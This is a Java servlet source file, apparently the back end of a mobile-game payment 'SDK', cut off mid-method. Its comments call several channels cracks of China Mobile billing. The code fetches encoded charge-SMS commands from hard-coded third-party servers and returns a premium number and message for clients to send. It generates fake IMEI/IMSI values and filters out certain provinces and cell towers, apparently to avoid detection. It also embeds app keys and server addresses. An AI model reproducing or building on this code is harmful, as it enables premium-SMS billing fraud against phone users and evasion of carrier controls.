package sdkReq;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.StringTokenizer;
import java.util.regex.Pattern;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import model.Cooperation;
import model.CooperationRemind;
import model.MmPayData;
import model.MsmList;
import model.Pay;
import model.SysParam;
import model.ZhangZhong;
//import mobi.zty.sdk.game.Constants;
import net.sf.json.JSONObject;

import org.dom4j.DocumentHelper;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import util.ConstValue;
import util.DateUtil;
import util.DebuUtil;
import util.SaConfiguration;
import util.StringUtil;
import azul.LBS;
import azul.MSMConten;

import com.alipay.sign.Base64;
import com.yeepay.HttpUtils;

import dao.ChannelDataDao;
import dao.CooperationDao;
import dao.CooperationRemindDao;
import dao.DevicePayDao;
import dao.FilterCellDao;
import dao.MmPayDataDao;
import dao.ModelipDao;
import dao.MsmListDao;
import dao.SysParamDao;
import dao.ZhangZhongDao;

public class GetAmountIndex extends HttpServlet{

	
	/**
	 * 
	 */
	private static final long serialVersionUID = -8783499538690341229L;

	public void init(ServletConfig config) throws ServletException {
		super.init(config);
		initData();
	}
	static String MEILING = "1";
	static String COMPA = "2";
	static String LIJIE = "3";
	static String ZIYan = "4";
	static String zhangzhong = "5";//掌中
	static String LIJIEQIANG = "6";//lijie强
	static String YOUXI = "7";//摩越移动mm破解
	static String MOYUEYOUXI = "8";//摩越游戏基地破解
	static String Xzhangzhong = "9";//掌中
	
	static Integer  connNum = 0;
	//static String RedirectURL = "";//"http://211.154.152.59:8080/sdk/getcon";
	//static Integer RedirectNum = 10;
	static  Object xlock = new Object();
	static String imeiHead = "864318";
	static String imsiHead = "46002";
	static String filterAddr = "广州_海南 _江苏";//海南 江苏
	static Integer  bOpen = 1;
	//static SysParam sysParam = null;
	public static void incrConnNum()
	{
	    synchronized(xlock)
	    {
	    	connNum ++;
	    }
	}
	
	public static void dscConnNum()
	{
	    synchronized(xlock)
	    {
	    	connNum --;
	    }
	}
	
	public static String getMSM(String chn,String imei,String imsi,String uData)
	{
		String strUrl = "http://124.202.141.81:8080/MMSocketSer/MMServlet";   
        
        Map<String,String> map=new HashMap<String,String>();    
        map.put("chn", chn);    
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("xexdata", uData);   
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		
		return msmrsq;
	}
	
	//http://proxy.gzmtx.cn:8080/mm?appKey=F1A2C419E41C1DDB&imei=554552&imsi=5452424242&code=30000851678208&data=100
	public static String getMSM3(String strUrl,String appKey,String paycode,String imei,String imsi,String uData,String channel)//阿安
	{
		//String strUrl = "http://proxy.gzmtx.cn:8080/mm";   
        
        Map<String,String> map=new HashMap<String,String>();   
        // GetAmountIndex.getMSM3("http://pay.gzmtx.cn:8080/mm","2C9292B3E39886B7","30000838149101","546566643","546455633","64654564");
        //http://pay.gzmtx.cn:8080/mm?appKey=2C9292B3E39886B7&code=30000838149101&imei=546566643&imsi=546455633&data=64654564
        map.put("appKey", appKey);   
        map.put("code", paycode);    
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("data", uData);   
        if(!StringUtil.is_nullString(channel))
        {
        	map.put("channelId", channel);   
        }
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		
		if(msmrsq.contains("error_code") || msmrsq.contains("provider"))
		{
			msmrsq = "";
		}
		return msmrsq;
	}
	public static String getMSM5(String strUrl,String appKey,String paycode,String imei,String imsi,String os,String model,String userdata, String pay,String channel,String code)//阿安
	{
		//String strUrl = "http://proxy.gzmtx.cn:8080/mm";   
        
        Map<String,String> map=new HashMap<String,String>();   
        // GetAmountIndex.getMSM3("http://pay.gzmtx.cn:8080/mm","2C9292B3E39886B7","30000838149101","546566643","546455633","64654564");
        //http://pay.gzmtx.cn:8080/mm?appKey=2C9292B3E39886B7&code=30000838149101&imei=546566643&imsi=546455633&data=64654564
        map.put("appKey", appKey);   
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("code", paycode);    
        map.put("os", os);    
        map.put("model", model);    
        map.put("data", userdata);   
        map.put("pay", pay);   
        
        if(!StringUtil.is_nullString(channel))
        {
        	map.put("channelId", channel);   
        }
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		
		if(msmrsq.contains("<error_code>2041</error_code>") || msmrsq.contains("<error_code>201</error_code>"))
		{
			msmrsq = "";
		}
		else if(msmrsq.contains("<error_code>0</error_code>"))
		{
			msmrsq = "success";
		}
		return msmrsq;
	}
	public static String getMSM7(String strUrl,String paycode,String imei,String imsi,String channel,String payid,String channelid)//游戏基地
	{
		//strUrl = "http://182.92.21.219:10789/cmcc/mm/single/chargeSMS";   
        
        Map<String,String> map=new HashMap<String,String>();   
  //http://182.92.21.219:10789/cmcc/mm/single/chargeSMS?pid=6381754877-7126887100&imei=863590054516191&imsi=460003281843884&chargeId=30000848148101&channelId=3003971774
         
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("chargeId", paycode); 
        map.put("channelId",channelid);
        map.put("version","1.0.0.7");
        map.put("payid",payid);
        map.put("pid", channel);   
     
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}			
		try{ //解析游戏基地xml
			//<p><status>0</status><error></error><errorInfo></errorInfo><chargeSMS><SMS>YTMjMVNONVUjMURPSEpHRSM0SjIyTDkyUlZXIzhJNDdTTDgzME4jMlJFTFdEI0FNVTc2RFpFVCNGRTk5MjgzQjREN0U3QTJGIzdCOERERUU1RUNGRUU4ODEjRkRFQjc1ODI2RDM0NkFEMCM=</SMS></chargeSMS></p>
			 org.dom4j.Document document = DocumentHelper.parseText(msmrsq);
			 org.dom4j.Node msmrsq1 = document.selectSingleNode("/p/chargeSMS/SMS");
			 System.out.println(msmrsq1.getText());
			 msmrsq = msmrsq1.getText();

		}catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}	
	    	return msmrsq;		
	    	
	}

	public static String getMSM8(String strUrl,String paycode,String imei,String imsi,String channel,String payid,String channelid)//游戏基地
	{
		//strUrl = "http://182.92.21.219:10789/cmcc/mm/single/chargeSMS";   
        
        Map<String,String> map=new HashMap<String,String>();   
 //http://182.92.21.219:10789/cmcc/g/single/s2sChargeSMS?pid=6381754877-5516565108&imsi=460003281843884&imei=863590054516191&version=1.0.0.7&payId=0000000000000000&chargeId=006059922001&contentId=606916026334&channelId=40977000
         
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("chargeId", paycode); 
        map.put("channelId","40977000");
        map.put("version","1.0.0.7");
        map.put("payId",payid);
        map.put("pid", channel);   
        map.put("contentId", channelid);   
     
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}			
		try{ //解析游戏基地xml
			//<p><status>0</status><error></error><errorInfo></errorInfo><chargeSMS><SMS>YTMjMVNONVUjMURPSEpHRSM0SjIyTDkyUlZXIzhJNDdTTDgzME4jMlJFTFdEI0FNVTc2RFpFVCNGRTk5MjgzQjREN0U3QTJGIzdCOERERUU1RUNGRUU4ODEjRkRFQjc1ODI2RDM0NkFEMCM=</SMS></chargeSMS></p>
			 org.dom4j.Document document = DocumentHelper.parseText(msmrsq);
			 org.dom4j.Node msmrsq1 = document.selectSingleNode("/p/registSMS/SMS");
			 org.dom4j.Node msmrsq2 = document.selectSingleNode("/p/chargeSMS/SMS");
			 
			 String msmtest1 = msmrsq1.getText();
			 String msmtest2 = msmrsq2.getText();
			 msmrsq = new String(Base64.decode(msmtest1),"UTF-8") +"_"+ new String(Base64.decode(msmtest2),"UTF-8");

		}catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}	
	    	return msmrsq;		
	    	
	}
	//掌中乐游
	public static String getMSM4(String strUrl,String app_id,String paycode,String imei,String imsi,String uData,String channel,String IP,boolean bCardPay,int amount)//阿安
	{
		//String strUrl = "http://proxy.gzmtx.cn:8080/mm";   
        
        Map<String,String> map=new HashMap<String,String>();   
        // GetAmountIndex.getMSM3("http://pay.gzmtx.cn:8080/mm","2C9292B3E39886B7","30000838149101","546566643","546455633","64654564");
        //http://pay.gzmtx.cn:8080/mm?appKey=2C9292B3E39886B7&code=30000838149101&imei=546566643&imsi=546455633&data=64654564
        
        map.put("app_id", app_id);   
        map.put("paycode", paycode);    
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("operation", "102");  
        map.put("sid", Pay.getOutTradeNoINC()); //Pay.getOutTradeNoINC()
        
       // map.put("data", uData);   
        if(!StringUtil.is_nullString(channel))
        {
        	map.put("channel_id", channel);   
        }
        if(!StringUtil.is_nullString(IP))
        {
        	map.put("ip", IP);   
        }
        
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		
		if(!StringUtil.is_nullString(msmrsq))
		{
			System.out.println(msmrsq);
		    JSONObject json = JSONObject.fromObject(msmrsq);
		    String result = json.getString("result");
		    if(result.equals("0"))
		    {
		    	String smsmsg = json.getString("smsmsg");
		    	if(!StringUtil.is_nullString(smsmsg)){
		    	try {
		    		msmrsq = new String(Base64.decode(smsmsg),"UTF-8");
		    	} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		    	}else{
		    		msmrsq = json.getString("smsbin");
		    		}
		    	
					//if(msmrsq.contains("\""))//掌中乐游
					{
					//System.out.println("dfdf"+msmrsq);
					// ZhangZhongDao zhangZhongDao = new ZhangZhongDao();
 				    //ZhangZhong zhangZhong =zhangZhongDao.getRecord("5869249\"561");
 				  // System.out.println(zhangZhong.getData());
					}
					String[] payList = msmrsq.split("#");
					
					//if(bCardPay == false)
					{
						ZhangZhong zhangZhong = new ZhangZhong();
						zhangZhong.setZzdata(map.get("sid"));//(payList[payList.length-1]);
						zhangZhong.setImei(imei);
						zhangZhong.setData(uData);
						zhangZhong.setSid(map.get("sid"));
						zhangZhong.setAmount(amount);
						ZhangZhongDao zhangZhongDao = new ZhangZhongDao();
						zhangZhongDao.add(zhangZhong);
					}
					/*for(int i = 0;i<payList.length;i++){
						if(i == 0)
						{
							msmrsq = payList[i];
						}
						else if(i == (payList.length-1))
						{
							msmrsq += "#"+uData;
						}
						else
						{
							msmrsq += "#"+payList[i];
						}
					//System.out.println(payList[i]);
					}*/
					
				
		    }
		    else
		    {
		    	msmrsq = "";
		    }
		}
		
		//System.out.println(msmrsq);
		return msmrsq;
	}
	public static String getMSM44(String strUrl,String app_id,String paycode,String imei,String imsi,String uData,String channel,String IP,boolean bCardPay,int amount)//
	{
		//String strUrl = "http://proxy.gzmtx.cn:8080/mm";   
        
        Map<String,String> map=new HashMap<String,String>();   
        // GetAmountIndex.getMSM3("http://pay.gzmtx.cn:8080/mm","2C9292B3E39886B7","30000838149101","546566643","546455633","64654564");
        //http://pay.gzmtx.cn:8080/mm?appKey=2C9292B3E39886B7&code=30000838149101&imei=546566643&imsi=546455633&data=64654564
        
        map.put("app_id", app_id);   
        map.put("paycode", paycode);    
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("operation", "102");  
        map.put("sid", Pay.getOutTradeNoINC()); //Pay.getOutTradeNoINC()
        
       // map.put("data", uData);   
        if(!StringUtil.is_nullString(channel))
        {
        	map.put("channel_id", channel);   
        }
        if(!StringUtil.is_nullString(IP))
        {
        	map.put("ip", IP);   
        }
        
        String msmrsq = "";
        
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		if(!StringUtil.is_nullString(msmrsq))
		{
			System.out.println(msmrsq);
		    JSONObject json = JSONObject.fromObject(msmrsq);
		    String result = json.getString("result");
		    if(result.equals("0"))
		    {
		    	
		    	msmrsq = json.getString("smsbin");
		    	try {
		    		//msmrsq = new String(Base64.decode(smsmsg),"UTF-8");
		
					//String[] payList = msmrsq.split("#");
					
					//if(bCardPay == false)
					{
						ZhangZhong zhangZhong = new ZhangZhong();
						zhangZhong.setZzdata(map.get("sid"));//(payList[payList.length-1]);
						zhangZhong.setImei(imei);
						zhangZhong.setData(uData);
						zhangZhong.setSid(map.get("sid"));
						zhangZhong.setAmount(amount);
						ZhangZhongDao zhangZhongDao = new ZhangZhongDao();
						zhangZhongDao.add(zhangZhong);
					}
					/*for(int i = 0;i<payList.length;i++){
						if(i == 0)
						{
							msmrsq = payList[i];
						}
						else if(i == (payList.length-1))
						{
							msmrsq += "#"+uData;
						}
						else
						{
							msmrsq += "#"+payList[i];
						}
					//System.out.println(payList[i]);
					}*/
					
				} catch (Exception e) {
					// TODO Auto-generated catch block 
					e.printStackTrace();
				}
		    }
		    else
		    {
		    	msmrsq = "";
		    }
		}

		//System.out.println(msmrsq);
		return msmrsq;
	}
	
	public static String getNodeValue(Node node){
		try{
			return node.getFirstChild().getNodeValue();
		}catch(Exception e){}
		return null;
	}
	
	public static  void parseMMRsq(String xmlstr,MsmList obj) 
	{
		// step 1: 获得dom解析器工厂（工作的作用是用于创建具体的解析器）
		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
		
		
		// step 2:获得具体的dom解析器
		DocumentBuilder db=null;
		try {
			db = dbf.newDocumentBuilder();
		} catch (ParserConfigurationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		// step3: 解析一个xml文档，获得Document对象（根结点）
		Document document=null;
		try {
			InputStream is = new ByteArrayInputStream(xmlstr.getBytes()); 
			document = db.parse(is);//new File("candidate.xml")
		} catch (SAXException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//FileUtil.write("log.txt",xmlstr);
		//NodeList list = document.getElementsByTagName("SyncAppOrderReq");
		Element root = document.getDocumentElement();
		NodeList list = root.getChildNodes();
        int size=list.getLength();
        
		//NodeList list = document.getElementsByTagName("SyncAppOrderReq");
		//System.out.println("list.getLength():" + list.());
        //DebuUtil.log("xmlstr:"+xmlstr);
		boolean bFail = false;
		int paytype = 1;
		for(int i=0;i<size;i++)
		{
			Node node =list.item(i);
    		String tagName=node.getNodeName();
    		//System.out.println("tagName:" + tagName);
    		if(tagName.equalsIgnoreCase("status"))
    		{
    			String ret=getNodeValue(node);
    			String code ="1";
    			if(ret.equals("0"))
    			{
    				code = "0";
    			}
    			obj.code = code;
    			//System.out.println("AppID:" + ret);
    		}
    		else if(tagName.equalsIgnoreCase("chargeSMS"))
    		{
    			NodeList chargeSMSlist = node.getChildNodes();
    			for(int j=0;j<chargeSMSlist.getLength();j++)
    			{
    				Node nodechargeSMS =chargeSMSlist.item(j);
    	    		String tagNamechargeSMS=nodechargeSMS.getNodeName();
    	    		
    	    		if(tagNamechargeSMS.equalsIgnoreCase("SMS"))
    	    		{
    	    			String ret=getNodeValue(nodechargeSMS);
    	    			if(!StringUtil.is_nullString(ret))
    	    			{
	    	    			try {
	    						obj.msg = new String(Base64.decode(ret),"UTF-8");
	    					} catch (UnsupportedEncodingException e) {
	    						// TODO Auto-generated catch block
	    						e.printStackTrace();
	    					};
	    					obj.num = "1065842410";
    	    			}
    	    			//System.out.println("AppID:" + ret);
    	    		}
	    			
	    			
    			}
    			//System.out.println("PayCode:" + ret);
    		}
    		
    		
    		
    		
    		//ReturnCode
    		//
		}
			
	}
	
	public static String getMSM2(String pid,String chn,String channel,String imei,String imsi,String uData)//
	{
		String strUrl = "http://182.92.21.219:10789/cmcc/mm/single/chargeSMS";   
        
        Map<String,String> map=new HashMap<String,String>();  
        
        map.put("version", "1.0.0.7");    //
        map.put("pid", pid);
        map.put("chargeId", chn);//
       // map.put("channelId", paycode);
        map.put("imei", imei);   
        map.put("imsi", imsi);  
        map.put("payId", uData);   
        String msmrsq = "";
		try {
			List list= HttpUtils.URLGet(strUrl, map,3000);
			for(int i = 0; i < list.size() ; i++)
			{
				String str = (String) list.get(i);
				msmrsq += str;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return msmrsq;
	}
	
	public void test()
	{
		
		MsmList msmList = new MsmList();
		msmList.setChn("2015");
        msmList.setImei("645647876564" );
        msmList.setImsi("6478746544");
        msmList.setXexdata("1456465");
        
        MsmListDao  msmListDao = new MsmListDao();
		msmListDao.add(msmList);
	}
	
	  public static String getOutTradeNo(int count) {
			SimpleDateFormat format = new SimpleDateFormat("ssmm");//HHddMM
			Date date = new Date();
			String key = format.format(date);

			java.util.Random r = new java.util.Random();
			
			int ran = r.nextInt();
			if(ran < 0)
			{
				ran = 0-ran;
			}
			key += ran;
			
			key = key.substring(0, count);
			//key = "010217153010087";//lsl
			//Log.d(TAG, "outTradeNo: " + key);
			return key;
	}
	 public static String getIMEI(String head)//getIMEI
	  {
	     String ret = "";//((TelephonyManager)context.getSystemService("phone")).getDeviceId();	 
	     ret =head+ getOutTradeNo(15-head.length());//9//"863590"
	     return ret;
   }
	  
	 public static String getIMSI(String head)//getIMSI
	 {
		 //"460029140953268"
	   String ret = "";//((TelephonyManager)context.getSystemService("phone")).getSubscriberId();
	   //if ((ret == null) || (ret.equals("")))
		//   ret = "10086";
	    ret = head+getOutTradeNo(15-head.length());//10//"46002"
	   //Util_G.debug_e(Util_G.busylog, "imsi:"+ret); 
	   return ret;
	 }
	 
	 public static void HandleReq_test(int amount,String imei,String imsi,String packet_id,String game_id,String OrderNO)
		{
			PrintWriter out = null;
			int index = 0;
			String userdata = packet_id;
			
		
			
	        JSONObject rsqjson = new JSONObject();
			
	        
	        if(!StringUtil.is_nullString(OrderNO))
	        {
	        	if(packet_id.equals("411200001"))//惠恩通达，雷电战机4.0_经典版
	        	{
	        		userdata = OrderNO;
	        	}
	        	else
	        	{
	        	    userdata = packet_id+"_"+OrderNO;
	        	}
	        }
			CooperationDao cooperationDao = new CooperationDao();
			Cooperation cop = cooperationDao.getRecord(packet_id);
			String pay_id = cop.getPayId();
			
			DebuUtil.log("pay_id对应的值为："+pay_id);
			
			MmPayDataDao mmPayDataDao = new MmPayDataDao();
			MmPayData paydata = mmPayDataDao.getRecord(pay_id);
			
			String pay_amount = paydata.getPayAmount();
			DebuUtil.log("payamount："+pay_amount);
			String pay_com = paydata.getConpanyName();
			
			if(StringUtil.is_nullString(pay_com))
			{
				pay_com = "";
			}
			String[] payList = pay_amount.split(",");
			
			for(int i = 0;i<payList.length;i++){
				int v = Integer.valueOf(payList[i]);
				if (v == amount) {
					index = i+1;
					break;
				}
			}
			
			//chnno = pay_id;//25
	        //}
	        //index = 1;//1
			if(!StringUtil.is_nullString(game_id))
			{
				if(game_id.equals("197"))
				{
					index = 58+index-1;
				}
				DebuUtil.log("index="+index);
			}
			
			/////////////////////////////
			if(pay_id.contains("_"))
        	{
				String splitstr = pay_id;
				 String[] strarray=splitstr.split("_");     		
				 pay_id = strarray[0];
        	}
			//////////////////////////////////
	        String chn = String.format("%s%02d",pay_id,index);
	        
			
		    MsmList msmList = new MsmList();
	        msmList.setChn(chn);
	        msmList.setImei(imei );
	        msmList.setImsi(imsi);
	        
	        msmList.setXexdata(userdata);
	        msmList.setAmount(amount);
		        
	        String num = "";
			String content = "";
			String code =""; 
			
			//getMSM3(String appKey,String paycode,String imei,String imsi,String uData)
	        if(pay_id.equals("300008481481"))//sppro
	        {
	        	String pid = "6381754877-7126887100";
	        	String channel = "3003971774";
	        	String rsq = GetAmountIndex.getMSM2(pid,chn,channel, imei, imsi, packet_id);    
	        	if(!StringUtil.is_nullString(rsq))
	        	{
	    		   parseMMRsq(rsq, msmList) ;	
	        	}
	    		 DebuUtil.log("回应数据="+rsq);
	        }
	        else if(pay_id.equals("300008516782") || pay_com.equals(LIJIE))//阿安星星祖玛//
	        {
	        	String appKey = paydata.getPayKey();
	        	String strUrl = "http://pay.gzmtx.cn:8080/mm";  //http://pay.gzmtx.cn:8080/mm
	        	if(pay_id.equals("300008516782"))
	        	{
	        		strUrl = "http://proxy.gzmtx.cn:8080/mm";
	        		appKey = "F1A2C419E41C1DDB";
	        	}
	        	String channel = paydata.getPayType();
	        	if(channel.contains("mm"))
	        	{
	        		channel = "";
	        	}
	        		
	        	String rsq = getMSM3(strUrl,appKey, chn, imei, imsi, packet_id,channel);    	
	        	if(!StringUtil.is_nullString(rsq))
	        	{
	        		 DebuUtil.log("回应数据="+rsq);
	        		msmList.num = "1065842410";
	        		msmList.code = "0";
	        		msmList.msg = rsq;
	        	}
	        }
	        else if(pay_com.equals(LIJIEQIANG)){
	        	String strUrl = "http://120.24.236.63:8080/mm";
	        	String appKey = paydata.getPayKey();
	        	String os = "4.2.1";
	        	String model = "2013022";
	        	String data = "0000000";
	        	String pay = "auto";
	        	String paycode = String.format("%s%02d",pay_id,index);
	        	String channel = paydata.getPayType();
	        	if(channel.contains("mm"))
	        	{
	        		channel = "";
	        	}
	        	
	        	String rsq = getMSM5(strUrl,appKey,paycode,imei,imsi,os,model,data,pay,channel,code);    	
	        	if(!StringUtil.is_nullString(rsq))
	        	{        		
	        		DebuUtil.log("回应数据3="+rsq);
	        		msmList.num = "10658424";
	        		msmList.code = code;
	        		msmList.msg = rsq;
	        	}
        	}
	        else if( pay_com.equals(ZIYan))//自研
	        {
	        	
	        	String strAppKey = paydata.getPayKey();
	        	String strApkPublicKey=paydata.getPublicKey();
                String strProID = paydata.getProId();
                //String strAppKey =paydata.getPublicKey();//"B56711EBA69EBA19";
                String md5 = paydata.getMd5();//"379094F6A6685668B874FE692B9FFC69";
                String md5dex = paydata.getMd5dex();//"T8UsMmgJeoVGpmip68Q136td6XM="	
                String strChannelID = paydata.getPayType();//LongToString(parseLong());//"GL21Y7RLN";
                
                String msm = MSMConten.getMSGContent(strApkPublicKey, strAppKey, md5, md5dex,
        			    strProID, strChannelID, chn, imei, imsi,packet_id);
                
	        	
	        	DebuUtil.log("自研回应数据="+msm);
	        	msmList.num = "1065842410";
	        	msmList.code = "0";
	        	msmList.msg = msm;
	        	
	        }
	        else
	        {
		        String msmrsq = getMSM(chn, imei, imsi, userdata);//美林互动
		        DebuUtil.log("回应数据="+msmrsq);
				JSONObject mssjson = null;
				if(!StringUtil.is_nullString(msmrsq))
				{
					mssjson = JSONObject.fromObject(msmrsq);//381182002,405200002
				}
				if(mssjson != null)
				{			
					code =mssjson.getString("code"); 
					num = mssjson.getString("desttermid");
					content = mssjson.getString("msg");
					if(code.equals("1"))
					{
						num = "";
					}				
				}
				msmList.setNum(num);
				msmList.setMsg(content);
				msmList.setCode(code);
	        }
		
			String bDel = "0";
			String fillCon = "中国移动";
			//String content = "";	
			
				
			//MsmListDao  msmListDao = new MsmListDao();
			//msmListDao.add(msmList);
			
			
			rsqjson.put("num",msmList.getNum());//imei
			rsqjson.put("content",msmList.getMsg());//imei
			rsqjson.put("bDel",bDel);
			rsqjson.put("FillCon",fillCon);
			
			
			////////////////////////////////////////////////////
			MsmListDao  msmListDao = new MsmListDao();
			msmListDao.add(msmList);
			////////////////////////////////////////////////
			
			if(packet_id.equals("389182001"))
			{
				 out.print(content);
			}
			else
			{
			    out.print(rsqjson.toString());
			}
			//out.print("OK");
			out.close();
		}
		
	public static boolean  isIMEI(String imei)
	{
		boolean result = false;
        boolean bOK = true;
        if(StringUtil.is_nullString(imei))
        {
        	//imei = getIMEI("863590")
        	bOK = false;
        }
        else
        {
        	  result = imei.matches(".*\\p{Alpha}.*");
             if(imei.contains("null")||result == true)
             {
            	 bOK = false;
             }
        }
        return bOK;
	}
	
	static int isFilterAddr(String addrList,String addr)
	{
		int bFilter = 0;
		
		 if(!StringUtil.is_nullString(addr))
		 {
			 DebuUtil.log("addr="+addr);
			 
			StringTokenizer token=new StringTokenizer(addrList,"_");  
	        while(token.hasMoreElements()){ 
	        	String v = token.nextToken();
	        	if(addr.contains(v))
	        	{
	        		bFilter = 1;
	        	}
	        } 
		 }
		 
        return bFilter;
        
	}
	
	public static void HandleReq(int amount,String imei,String imsi,String packet_id,String game_id,String OrderNO, HttpServletResponse response)
	{
		HandleReq(amount,-1, imei, imsi, packet_id, game_id, OrderNO,"","","","","","","","",response);
	}
	
	
	 public static String  getRegionCode(String region,String code)
	  {
		  final Map addrMap=new HashMap<String,String>();
		  String ret = "";
		  //A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
		      //安徽a，北京b，福建c，甘肃d，广东e，广西f，贵州g，海南h，河北i，河南j，黑龙江k，湖北l，湖南m，吉林n，江苏o，江西p，
		  //辽宁q，内蒙古r，宁夏s，青海t，山东u，山西v，陕西w，上海x，四川y，天津z，西藏A，新疆B，云南C，浙江D，重庆E
		  if(addrMap.size() < 10)
		  {
			  addrMap.put("安徽", "a");
			  addrMap.put("北京", "b");
			  addrMap.put("福建", "c");
			  addrMap.put("甘肃", "d");
			  addrMap.put("广东", "e");
			  addrMap.put("广西", "f");
			  addrMap.put("贵州", "g");
			  addrMap.put("海南", "h");
			  addrMap.put("河北", "i");
			  addrMap.put("河南", "j");
			  addrMap.put("黑龙江", "k");
			  addrMap.put("湖北", "l");
			  addrMap.put("湖南", "m");
			  addrMap.put("吉林", "n");
			  addrMap.put("江苏", "o");
			  addrMap.put("江西", "p");
			  addrMap.put("辽宁", "q");
			  addrMap.put("内蒙古", "r");
			  addrMap.put("宁夏", "s");
			  addrMap.put("青海", "t");
			  addrMap.put("山东", "u");
			  addrMap.put("山西", "v");
			  addrMap.put("陕西", "w");
			  addrMap.put("上海", "x");
			  addrMap.put("四川", "y");
			  addrMap.put("天津", "z");
			  addrMap.put("西藏", "A");
			  addrMap.put("新疆", "B");
			  addrMap.put("云南", "C");
			  addrMap.put("浙江", "D");
			  addrMap.put("重庆", "E");
		  }
		  
		 		  
		  Iterator it =  addrMap.entrySet().iterator();
          while(it.hasNext())
          {          
              Entry  obj = (Entry) it.next();
              //System.out.println(obj.getKey()+" "+obj.getValue());
              if(!StringUtil.is_nullString(code))
              {
		          if(obj.getValue().equals(code))
		          {
		        	  ret = (String)obj.getKey();
		        	  break;
		          }
              }
              else
              {
            	  if(!StringUtil.is_nullString(region))
            	  {
	            	  if(region.contains((String)obj.getKey()))
			          {
			        	  ret = (String)obj.getValue();
			        	  break;
			          }
            	  }
              }
              
          }
		 
		  return ret;
	  }
	 
	public static void HandleReq(int amount,int indx,String imei,String imsi,String packet_id,String game_id
			,String OrderNO,String addr,String phonenum,String mcc,String mnc,String cell,String lac,String IP, String Ver,HttpServletResponse response)
	{
		PrintWriter out = null;
		int index = 0;
		String userdata = packet_id;		
		int bFilter = 0;
		boolean bCH = false;//是否含有中文		
		String provinceCode = GetAmountIndex.getRegionCode(addr, "");
		String province = GetAmountIndex.getRegionCode("", provinceCode);
		if(response != null)
		{
			response.setContentType("text/html;charset=utf8");
			
			try {
				 out = response.getWriter();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		CooperationDao cooperationDao = new CooperationDao();
		Cooperation cop = cooperationDao.getRecord(packet_id);
		if(cop == null)
		{
			out.close();
			return ;
		}
		
		SysParam sysParam = null;
		SysParamDao sysParamDao = new SysParamDao();
		sysParam = sysParamDao.getRecord();
		
		
		//根据时间日期地区屏蔽取指令
		//if(ConstValue.bNew == 1)
		bFilter = addrFilter(cop,addr);
		
		
		
		/*else
		{
			bFilter = isFilterAddr(filterAddr,addr);
		}*/
		
		if(!StringUtil.is_nullString(mcc))
		{
			 int imcc = Integer.valueOf(mcc);
			 int imnc = Integer.valueOf(mnc);
			 int icell_id = Integer.valueOf(cell);
			 int ilac = Integer.valueOf(lac);
			 String ret = "";
			 FilterCellDao lBSDao = new FilterCellDao();
			 ret = lBSDao.getLBS(icell_id,ilac);
			 
			 if(!StringUtil.is_nullString(ret))
			 {
				 bFilter = 1;
			 }
			 else if(!StringUtil.is_nullString(Ver))
			 {			 
			    addr = LBS.getLBS(mcc,mnc,cell,lac);
			    bFilter = isFilterAddr(filterAddr,addr);
			 }
			 
		}
		if(!StringUtil.is_nullString(addr)){
